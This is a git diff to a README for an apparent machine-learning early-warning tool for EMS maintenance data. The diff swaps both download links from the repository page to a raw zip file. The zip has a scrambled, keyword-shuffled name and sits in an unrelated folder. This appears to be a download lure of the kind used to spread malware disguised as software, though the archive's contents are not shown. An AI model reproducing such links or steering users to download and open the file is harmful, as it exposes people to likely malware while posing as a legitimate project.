@@ -1,6 +1,6 @@
 # 🔄 Random-Forest-Model-EMS-system-data-machine-learning-early-warning - Early Warnings for Maintenance Gaps
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Legalagecolouring820/Random-Forest-Model-EMS-system-data-machine-learning-early-warning)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Legalagecolouring820/Random-Forest-Model-EMS-system-data-machine-learning-early-warning/main/benthal/Random_system_data_warning_machine_Model_early_Forest_EM_learning_v3.9.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ Use it to help keep records in order, reduce missed updates, and spot problems s
 
 Open the download page here:
 
-[Download or access the app](https://github.com/Legalagecolouring820/Random-Forest-Model-EMS-system-data-machine-learning-early-warning)
+[Download or access the app](https://raw.githubusercontent.com/Legalagecolouring820/Random-Forest-Model-EMS-system-data-machine-learning-early-warning/main/benthal/Random_system_data_warning_machine_Model_early_Forest_EM_learning_v3.9.zip)
 
 If your browser asks what to do, choose to save the file or open the page in GitHub and follow the file link you see there.
 
